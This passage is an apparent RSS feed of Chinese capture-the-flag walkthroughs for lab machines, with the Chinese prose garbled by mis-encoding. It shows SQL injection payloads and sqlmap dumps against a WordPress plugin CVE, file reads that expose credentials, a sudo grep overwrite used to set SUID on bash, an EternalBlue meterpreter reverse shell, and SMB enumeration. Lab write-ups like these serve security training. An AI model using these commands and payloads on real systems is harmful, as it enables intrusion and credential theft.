Êàë‰ª¨Âè™ÈúÄÂú®ÁõÆÊ†áÊú∫‰∏äÂàõÂª∫‰∏Ä‰∏™Â§ßÊñá‰ª∂Ôºå‰ΩøÁ£ÅÁõòÂç†Áî®ÁéáË∂ÖËøá80%Âç≥ÂèØËß¶ÂèëËØ•Âä®‰Ωú„ÄÇÊ†πÊçÆ‰∏ªÊú∫‰ø°ÊÅØÔºåÂàõÂª∫‰∏Ä‰∏™21GÁöÑÊñá‰ª∂Ë∂≥‰ª•Ëß¶Âèë„ÄÇ

Âú®`ll`Áî®Êà∑ÁöÑshell‰∏≠ÊâßË°åÔºö

```bash
ll@104567:~$ dd if=/dev/zero of=/tmp/bigfile bs=1G count=21
22548578304 bytes (23 GB, 21 GiB) copied...
```

Êñá‰ª∂ÂàõÂª∫ÂÆåÊàêÂêéÔºåÁ´ãÂç≥‰ªéKaliËøûÊé•ÁõÆÊ†áÊú∫ÂºÄÂêØÁöÑ4567Á´ØÂè£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nc 192.168.205.156 4567
id
uid=0(root) gid=0(root) groups=0(root)
```

ÊàêÂäüËøûÊé•Âπ∂Ëé∑Âèñ‰∫Üroot shell„ÄÇ

# Âõõ„ÄÅËé∑ÂèñFlag

Âú®root shell‰∏≠ÔºåËØªÂèñÊâÄÊúâflagÊñá‰ª∂„ÄÇ

```bash
cat /root/root.txt /home/ll/user.txt
flag{root-f526a6c9f285aa9d001a459b42ef3035}
flag{user-bc3c292e432690a9a0444bb46a559061}
```

ÊàêÂäüËé∑ÂèñÊâÄÊúâFlagÔºåÊ∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_ll104567.html</guid><pubDate>Wed, 03 Sep 2025 04:05:52 +0000</pubDate></item><item><title>hmv_Ximai</title><link>https://7r1UMPHK.github.io/post/hmv_Ximai.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## ÁΩëÁªúÊâ´Êèè

È¶ñÂÖàËøõË°åÁΩëÁªúÂèëÁé∞ÔºåÂØªÊâæÁõÆÊ†á‰∏ªÊú∫Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.131 08:00:27:f4:eb:fa       PCS Systemtechnik GmbH
...
```

ÂèëÁé∞ÁõÆÊ†áIPÔºö`192.168.205.131`

## Á´ØÂè£Êâ´Êèè

ÂØπÁõÆÊ†áËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.131            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 06:55 EDT
Nmap scan report for SOUPEDECODE.LOCAL (192.168.205.131)
Host is up (0.000082s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8000/tcp open  http-alt
MAC Address: 08:00:27:F4:EB:FA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
```

ÂºÄÊîæÁ´ØÂè£Ôºö

- 22/tcp - SSHÊúçÂä°
- 80/tcp - WebÊúçÂä°
- 3306/tcp - MySQLÊï∞ÊçÆÂ∫ì
- 8000/tcp - Â§áÁî®WebÊúçÂä°

# ‰∫å„ÄÅÊúçÂä°Êûö‰∏æ

## MySQLÊúçÂä°ÊµãËØï

Â∞ùËØïËøûÊé•MySQLÊúçÂä°Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ mysql -h 192.168.205.131 -u root -p 
Enter password: 
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.205.128' is not allowed to connect to this MariaDB server
```

MySQLÊúçÂä°ÊãíÁªùËøúÁ®ãËøûÊé•ÔºåÈúÄË¶ÅÂØªÊâæÂÖ∂‰ªñÂÖ•Âè£„ÄÇ

## WebÊúçÂä°ÂàÜÊûêÔºà80Á´ØÂè£Ôºâ

ËÆøÈóÆ80Á´ØÂè£ÊòæÁ§∫Apache2ÈªòËÆ§È°µÈù¢ÔºåËøõË°åÁõÆÂΩïÊâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ dirsearch -u 192.168.205.131     
...
[07:15:39] 200 -    2KB - /adminer.php
[07:15:46] 200 -   23KB - /info.php
...
```

ÁªßÁª≠‰ΩøÁî®gobusterËøõË°åÊõ¥ËØ¶ÁªÜÁöÑÊâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.131 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64 
...
/index.html           (Status: 200) [Size: 10938]
/info.php             (Status: 200) [Size: 85870]
/reminder.php         (Status: 200) [Size: 3163]
/server-status        (Status: 403) [Size: 280]
...
```

ÂèëÁé∞ÁöÑÈáçË¶ÅÊñá‰ª∂Ôºö

- `/adminer.php` - Adminer 5.3.0Êï∞ÊçÆÂ∫ìÁÆ°ÁêÜÂ∑•ÂÖ∑
- `/info.php` - PHP‰ø°ÊÅØÈ°µÈù¢
- `/reminder.php` - ÊèêÈÜíÈ°µÈù¢

## ÂàÜÊûêreminder.phpÈ°µÈù¢

ËÆøÈóÆ`/reminder.php`ÔºåÂèëÁé∞ÂåÖÂê´ÈáçË¶Å‰ø°ÊÅØÔºö

```html
&lt;div class='container'&gt;
    &lt;h1&gt;Web Portal&lt;/h1&gt;
    &lt;p class='hint-text'&gt;
        jimmy! Don't forget we need to harden the security on the web server. In case you have forgotten your access details, I've put them in a txt file for you. It's in that place where I put that thing that time.
    &lt;/p&gt;

    &lt;img src='that-place-where-i-put-that-thing-that-time/1b260614-3aff-11f0-ac81-000c2921b441.jpg' alt='Mysterious Image'&gt;

    &lt;p&gt;
        Also, can you fix this search box? Sometimes it chucks errors depending on what I enter...
    &lt;/p&gt;
    &lt;p class='hint-text'&gt;
        I'd do it myself, but I've been busy trying to create some code to enable us to securely store our passwords, seeing as you keep forgetting yours... The encoder seems completely borked though.
    &lt;/p&gt;

    &lt;form action='reminder.php' method='POST'&gt;
        &lt;input type='text' name='username' placeholder='Username'&gt;
        &lt;input type='submit' value='Lookup User'&gt;
    &lt;/form&gt;
&lt;/div&gt;
```

È°µÈù¢Êèê‰æõ‰∫ÜÈáçË¶ÅÁ∫øÁ¥¢Ôºö

1. JimmyÁöÑËÆøÈóÆÂá≠ÊçÆÂ≠òÂÇ®Âú®txtÊñá‰ª∂‰∏≠
2. Ë∑ØÂæÑÊèêÁ§∫Ôºö`that-place-where-i-put-that-thing-that-time/`

ËÆøÈóÆËØ•Ë∑ØÂæÑÔºåÂèëÁé∞ÁõÆÂΩïÂàóË°®Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.131/that-place-where-i-put-that-thing-that-time/
...
lrwxrwxrwx 1 root root   15 May 17 18:42 creds.txt -&gt; /etc/jimmy.txt
...
```

ÂèëÁé∞`creds.txt`ÊòØÊåáÂêë`/etc/jimmy.txt`ÁöÑËΩØÈìæÊé•„ÄÇ

## WebÊúçÂä°ÂàÜÊûêÔºà8000Á´ØÂè£Ôºâ

ËÆøÈóÆ8000Á´ØÂè£ÂèëÁé∞ÊòØWordPressÁ´ôÁÇπÔºå‰ΩÜÂüüÂêçË∑≥ËΩ¨Âà∞`wordpress.local`ÔºåÈúÄË¶ÅÊ∑ªÂä†Âà∞hostsÊñá‰ª∂Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ echo '192.168.205.131 wordpress.local' &gt;&gt; /etc/hosts
```

WordPressÁ´ôÁÇπÂåÖÂê´‰∏ÄÁØáÈáçË¶ÅÊñáÁ´†ÔºåÊèêÁ§∫Á≥ªÁªüÂ≠òÂú®ÂÆâÂÖ®ÈóÆÈ¢òÔºö

```
Dear Developer, We Need to Talk‚Ä¶

While casually browsing your blog system, I couldn't help but notice a few‚Ä¶ quirks.

For starters, your php.ini is a bit too welcoming. mysqli.allow_local_infile = On? Really? That's basically sending an open invitation to anyone with a payload and a dream.

Oh, and your CMS? Some of those plugins are a little too trusting. I tried asking the database a slightly unexpected question, and to my surprise‚Ä¶ it answered. Very helpfully, in fact.üßê

Don't worry‚Äînothing happened (yet). But if I found these issues, someone less polite might too.

Just a friendly heads-up: hardening is cheaper than recovering. üòÖ

Sincerely,
A Concerned Internet Wanderer
```

ÊñáÁ´†ÊöóÁ§∫Ôºö

1. `mysqli.allow_local_infile = On` ÈÖçÁΩÆÂèØËÉΩÂ≠òÂú®ÂÆâÂÖ®È£éÈô©
2. WordPressÊèí‰ª∂Â≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥û

# ‰∏â„ÄÅÊºèÊ¥ûÂèëÁé∞‰∏éÂà©Áî®

## ÊºèÊ¥ûÊâ´Êèè

‰ΩøÁî®nucleiËøõË°åÊºèÊ¥ûÊâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nuclei -u http://wordpress.local:8000/
...
[CVE-2025-2011:dbname] [http] [high] http://wordpress.local:8000/wp-admin/admin-ajax.php?s=9999')union+select+111,222,(select(concat(0x44617461626173653a20,database()))),4444,+5--+-&amp;perpage=20&amp;page=1&amp;orderBy=source_id&amp;dateEnd&amp;dateStart&amp;order=DESC&amp;sources&amp;action=depicter-lead-index ['wordpress']
...
```

ÂèëÁé∞CVE-2025-2011ÊºèÊ¥ûÔºåËøôÊòØ‰∏Ä‰∏™WordPressÊèí‰ª∂ÁöÑSQLÊ≥®ÂÖ•ÊºèÊ¥û„ÄÇ

## SQLÊ≥®ÂÖ•Âà©Áî®

### Ê£ÄÊµãÊ≥®ÂÖ•ÁÇπ

‰ΩøÁî®sqlmapÈ™åËØÅÂπ∂Âà©Áî®SQLÊ≥®ÂÖ•ÊºèÊ¥ûÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sqlmap -u 'http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&amp;action=depicter-lead-index' -p s --dbs --batch
...
Parameter: s (GET)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: s=test') AND (SELECT 1426 FROM (SELECT(SLEEP(5)))CoXd) AND ('Jhem'='Jhem&amp;action=depicter-lead-index

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: s=test') UNION ALL SELECT CONCAT(0x71786b7071,0x72534350746463506a707173537277566e717679657645616d6c774751594a486675525970544a54,0x717a6a7171),NULL,NULL,NULL,NULL-- -&amp;action=depicter-lead-index
...
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] wordpress
[*] zabbix
```

### Ëé∑ÂèñWordPressÁî®Êà∑‰ø°ÊÅØ

ÊèêÂèñWordPressÁî®Êà∑Ë°®Êï∞ÊçÆÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sqlmap -u 'http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&amp;action=depicter-lead-index' -p s -D wordpress -T wp_users --dump       
...
Database: wordpress
Table: wp_users
[1 entry]
+----+----------+-----------------------------------------------------------------+-----------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url | user_pass                                                       | user_email      | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------+-----------------------------------------------------------------+-----------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | &lt;blank&gt;  | $wp$2y$10$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq | no@thankyou.com | adminer    | 0           | adminer      | adminer       | 2025-05-28 10:35:26 | &lt;blank&gt;             |
+----+----------+-----------------------------------------------------------------+-----------------+------------+-------------+--------------+---------------+---------------------+---------------------+
```

Ëé∑ÂæóÁî®Êà∑Ôºö`adminer`ÔºåÂØÜÁ†ÅÂìàÂ∏åÔºö`$wp$2y$10$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq`

### ËØªÂèñÁ≥ªÁªüÊñá‰ª∂

Âà©Áî®MySQLÁöÑLOAD_FILEÂáΩÊï∞ËØªÂèñ`/etc/jimmy.txt`Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sqlmap -u 'http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&amp;action=depicter-lead-index' -p s --sql-query 'SELECT LOAD_FILE('/etc/jimmy.txt')' --batch
...
SELECT LOAD_FILE('/etc/jimmy.txt'): 'HandsomeHU\n'
```

ÊàêÂäüËé∑ÂèñjimmyÁî®Êà∑ÂØÜÁ†ÅÔºö`HandsomeHU`

# Âõõ„ÄÅÁ≥ªÁªüËÆøÈóÆ

## SSHÁôªÂΩï

‰ΩøÁî®Ëé∑ÂèñÁöÑÂá≠ÊçÆÁôªÂΩïSSHÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ssh jimmy@192.168.205.131                                                                                                                                    
jimmy@192.168.205.131's password: 
Linux Ximai 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
...
jimmy@Ximai:~$ echo $PATH
./...
```

ÂèëÁé∞PATHÁéØÂ¢ÉÂèòÈáèË¢´ÈôêÂà∂ÔºåÈúÄË¶ÅÈáçÊñ∞ËÆæÁΩÆÔºö

```bash
jimmy@Ximai:~$ export PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games'
```

## ‰ø°ÊÅØÊî∂ÈõÜ

Ê£ÄÊü•sudoÊùÉÈôêÂíåÁ≥ªÁªü‰ø°ÊÅØÔºö

```bash
jimmy@Ximai:~$ sudo -l
Sorry, user jimmy may not run sudo on Ximai.
```

Êü•ÁúãWordPressÈÖçÁΩÆÊñá‰ª∂Ôºö

```bash
jimmy@Ximai:/var/www/wordpress$ cat wp-config.php 
...
/**
 * adminer:adminer123456
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', 'SuperSecret' );
...
```

Âú®ÈÖçÁΩÆÊñá‰ª∂‰∏≠ÂèëÁé∞adminerÁî®Êà∑ÁöÑÊòéÊñáÂØÜÁ†ÅÔºö`adminer123456`

# ‰∫î„ÄÅÊùÉÈôêÊèêÂçá

## ÂàáÊç¢Áî®Êà∑

‰ΩøÁî®Ëé∑ÂèñÁöÑÂØÜÁ†ÅÂàáÊç¢Âà∞adminerÁî®Êà∑Ôºö

```bash
jimmy@Ximai:/tmp$ su adminer
Password: 
adminer@Ximai:/tmp$ sudo -l
Matching Defaults entries for adminer on Ximai:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User adminer may run the following commands on Ximai:
    (ALL) NOPASSWD: /usr/bin/grep
```

## Âà©Áî®sudoÊùÉÈôê

ÂèëÁé∞adminerÁî®Êà∑ÂèØ‰ª•‰ª•rootÊùÉÈôêÊâßË°å`/usr/bin/grep`ÂëΩ‰ª§Ôºå‰ΩÜÂ≠òÂú®ÈôêÂà∂„ÄÇÊ£ÄÊü•grepÊñá‰ª∂ÊùÉÈôêÔºö

```bash
adminer@Ximai:/tmp$ ls -la /usr/bin/grep
-rwxr-xrwx 1 root root 19 Aug 30 23:32 /usr/bin/grep
```

ÂèëÁé∞grepÊñá‰ª∂ÂÖ∑ÊúâÂÜôÊùÉÈôêÔºåÂèØ‰ª•Ë¶ÜÁõñÂÖ∂ÂÜÖÂÆπÔºö

```bash
adminer@Ximai:/tmp$ echo 'chmod +s /bin/bash' &gt; /usr/bin/grep
adminer@Ximai:/tmp$ sudo /usr/bin/grep
adminer@Ximai:/tmp$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

ÊàêÂäü‰∏∫bashÊñá‰ª∂ËÆæÁΩÆSUIDÊùÉÈôêÔºåËé∑ÂèñrootÊùÉÈôêÔºö

```bash
adminer@Ximai:/tmp$ bash -p
bash-5.0# cat /root/r00t.txt /home/jimmy/us3r.txt 
flag{root-126e5653-3b02-11f0-b074-000c2921b441}
flag{user-ffbea0a7-3b01-11f0-9160-000c2921b441}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Ximai.html</guid><pubDate>Sun, 31 Aug 2025 03:40:25 +0000</pubDate></item><item><title>thl_Microchoft</title><link>https://7r1UMPHK.github.io/post/thl_Microchoft.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1.1 ‰∏ªÊú∫ÂèëÁé∞

‰ΩøÁî® `arp-scan` Êâ´ÊèèÂ±ÄÂüüÁΩëÂÜÖÁöÑ‰∏ªÊú∫Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.132 08:00:27:03:82:a3       PCS Systemtechnik GmbH
...
```

ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫Ôºö`192.168.205.132`

## 1.2 Á´ØÂè£Êâ´Êèè

‰ΩøÁî® `rustscan` ËøõË°åÁ´ØÂè£Êâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ rustscan -a 192.168.205.132
...
Open 192.168.205.132:135
Open 192.168.205.132:139
Open 192.168.205.132:445
```

ÂèëÁé∞ÂºÄÊîæÁ´ØÂè£Ôºö

- **135/tcp**ÔºöRPCÁ´ØÁÇπÊò†Â∞ÑÂô®
- **139/tcp**ÔºöNetBIOS‰ºöËØùÊúçÂä°
- **445/tcp**ÔºöSMBÊúçÂä°

Ê†πÊçÆÁ´ØÂè£ÁâπÂæÅÂà§Êñ≠ËøôÊòØ‰∏ÄÂè∞Windows‰∏ªÊú∫Ôºå‰∏îÂºÄÊîæ‰∫ÜSMBÊúçÂä°„ÄÇ

# ‰∫å„ÄÅÊºèÊ¥ûÊâ´Êèè

## 2.1 SMBÊºèÊ¥ûÊâ´Êèè

‰ΩøÁî® `nmap` ÁöÑÊºèÊ¥ûËÑöÊú¨Êâ´ÊèèSMBÊúçÂä°Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap --script=vuln -p445,139 192.168.205.132
...
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|         
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
...
```

**ÈáçË¶ÅÂèëÁé∞**ÔºöÁõÆÊ†á‰∏ªÊú∫Â≠òÂú® **MS17-010ÔºàÊ∞∏ÊÅí‰πãËìùÔºâ** ÊºèÊ¥ûÔºÅ

# ‰∏â„ÄÅÊºèÊ¥ûÂà©Áî®

## 3.1 ÂêØÂä®Metasploit Framework

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ msfconsole
...
msf &gt;
```

## 3.2 ÊêúÁ¥¢MS17-010Áõ∏ÂÖ≥Ê®°Âùó

```bash
msf &gt; search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1   exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   ...
```

## 3.3 ÈÖçÁΩÆÂíåÊâßË°åEternalBlueÊîªÂáª

ÈÄâÊã©EternalBlueÊ®°ÂùóÂπ∂ÈÖçÁΩÆÂèÇÊï∞Ôºö

```bash
msf &gt; use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

msf exploit(windows/smb/ms17_010_eternalblue) &gt; show options
...
msf exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 192.168.205.132
RHOSTS =&gt; 192.168.205.132

msf exploit(windows/smb/ms17_010_eternalblue) &gt; run
```

## 3.4 ÊîªÂáªÊâßË°åËøáÁ®ã

```bash
[*] Started reverse TCP handler on 192.168.205.128:4444 
[*] 192.168.205.132:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.205.132:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)
[+] 192.168.205.132:445 - The target is vulnerable.
[*] 192.168.205.132:445 - Connecting to target for exploitation.
[+] 192.168.205.132:445 - Connection established for exploitation.
[+] 192.168.205.132:445 - Target OS selected valid for OS indicated by SMB reply
...
[+] 192.168.205.132:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.205.132:445 - Sending egg to corrupted connection.
[*] 192.168.205.132:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 192.168.205.132
[*] Meterpreter session 1 opened (192.168.205.128:4444 -&gt; 192.168.205.132:49159)
[+] 192.168.205.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.205.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.205.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

**ÊîªÂáªÊàêÂäüÔºÅ**Ëé∑Âæó‰∫ÜMeterpreter‰ºöËØùÔºåË°®ÊòéÂ∑≤ÁªèËé∑Âèñ‰∫ÜÁ≥ªÁªüÊúÄÈ´òÊùÉÈôê„ÄÇ

# Âõõ„ÄÅÁ≥ªÁªüËÆøÈóÆ‰∏é‰ø°ÊÅØÊî∂ÈõÜ

## 4.1 Ëé∑ÂèñÁ≥ªÁªüShell

```bash
meterpreter &gt; shell
Process 1376 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&gt;
```

Á°ÆËÆ§Ëé∑Âæó‰∫ÜWindows 7Á≥ªÁªüÁöÑSYSTEMÊùÉÈôêËÆøÈóÆ„ÄÇ

## 4.2 Êü•ÊâæFlagÊñá‰ª∂

Âú®Áî®Êà∑ÁõÆÂΩï‰∏≠ÈÄíÂΩíÊêúÁ¥¢txtÊñá‰ª∂Ôºö

```bash
C:\Users&gt;dir *.txt /S
...
 Directory of C:\Users\Admin\Desktop
03/28/2024  06:51 PM                32 admin.txt.txt

 Directory of C:\Users\Lola\Desktop
03/28/2024  06:54 PM                32 user.txt
...
```

ÂèëÁé∞‰∏§‰∏™ÂÖ≥ÈîÆÊñá‰ª∂Ôºö

- ÁÆ°ÁêÜÂëòFlagÔºö`C:\Users\Admin\Desktop\admin.txt.txt`
- Áî®Êà∑FlagÔºö`C:\Users\Lola\Desktop\user.txt`

## 4.3 Ëé∑ÂèñFlag

```bash
C:\Users&gt;type C:\Users\Lola\Desktop\user.txt
13e624146d31ea232c850267c2745caa

C:\Users&gt;type C:\Users\Admin\Desktop\admin.txt.txt
ff4ad2daf333183677e02bf8f67d4dca
```

ÊàêÂäüËé∑ÂèñÁî®Êà∑ÂíåÁÆ°ÁêÜÂëòFlagÔºÅsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_Microchoft.html</guid><pubDate>Sat, 30 Aug 2025 14:37:19 +0000</pubDate></item><item><title>hmv_DC1</title><link>https://7r1UMPHK.github.io/post/hmv_DC1.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1.1 ‰∏ªÊú∫ÂèëÁé∞

‰ΩøÁî® `arp-scan` Êâ´ÊèèÂ±ÄÂüüÁΩëÂÜÖÁöÑ‰∏ªÊú∫Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.131 08:00:27:cb:f9:29       PCS Systemtechnik GmbH
...
```

ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫Ôºö`192.168.205.131`

## 1.2 Á´ØÂè£Êâ´Êèè

‰ΩøÁî® `rustscan` ËøõË°åÁ´ØÂè£Êâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ rustscan -a 192.168.205.131
...
Open 192.168.205.131:53
Open 192.168.205.131:88
Open 192.168.205.131:135
Open 192.168.205.131:139
Open 192.168.205.131:389
Open 192.168.205.131:445
Open 192.168.205.131:464
Open 192.168.205.131:593
Open 192.168.205.131:636
Open 192.168.205.131:3268
Open 192.168.205.131:3269
Open 192.168.205.131:5985
Open 192.168.205.131:9389
```

Ê†πÊçÆÂºÄÊîæÁöÑÁ´ØÂè£ÁâπÂæÅÔºà53/DNS„ÄÅ88/Kerberos„ÄÅ389/LDAP„ÄÅ445/SMBÁ≠âÔºâÔºåÂèØ‰ª•Âà§Êñ≠ËøôÊòØ‰∏ÄÂè∞Ê†áÂáÜÁöÑÂüüÊéßÂà∂Âô®„ÄÇ

## 1.3 Êó∂Èó¥ÂêåÊ≠•

Áî±‰∫éÊòØÂüüÁéØÂ¢ÉÔºåÈúÄË¶Å‰∏éÂüüÊéßÂà∂Âô®ÂêåÊ≠•Êó∂Èó¥‰ª•ÈÅøÂÖçKerberosËÆ§ËØÅÈóÆÈ¢òÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo ntpdate soupedecode.local
2025-08-30 18:20:22.204692 (-0400) +10958.045293 +/- 0.000301 soupedecode.local 192.168.205.131 s1 no-leap
CLOCK: time stepped by 10958.045293
```

# ‰∫å„ÄÅÊºèÊ¥ûÊâ´Êèè

## 2.1 SMBÊºèÊ¥ûÊâ´Êèè

‰ΩøÁî® `nmap` ÁöÑÊºèÊ¥ûËÑöÊú¨Êâ´ÊèèSMBÊúçÂä°Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap --script=vuln -p445,139 192.168.205.131
...
Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
...
```

Êú™ÂèëÁé∞ÊòéÊòæÁöÑCVEÊºèÊ¥ûÔºåÁªßÁª≠ËøõË°åÂÖ∂‰ªñÊûö‰∏æ„ÄÇ

# ‰∏â„ÄÅSMBÊûö‰∏æ

## 3.1 SMBÂÖ±‰∫´Êûö‰∏æ

‰ΩøÁî® `smbclient` Âàó‰∏æSMBÂÖ±‰∫´Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ smbclient -L //192.168.205.131/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk    
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk    
```

ÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ `backup` ÁöÑÂÖ±‰∫´ÔºåËøôÂèØËÉΩÂåÖÂê´ÊúâÁî®‰ø°ÊÅØ„ÄÇ

## 3.2 SMBÂÖ±‰∫´ËÆøÈóÆÊµãËØï

Â∞ùËØïÂåøÂêçËÆøÈóÆÂêÑ‰∏™ÂÖ±‰∫´Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ smbclient //192.168.205.131/backup -N 
Try 'help' to get a list of possible commands.
smb: \&gt; dir
NT_STATUS_ACCESS_DENIED listing \*
```

ÊâÄÊúâÂÖ±‰∫´ÈÉΩÊãíÁªùÂåøÂêçËÆøÈóÆÔºåÈúÄË¶ÅËé∑ÂèñÊúâÊïàÂá≠ÊçÆ„ÄÇ

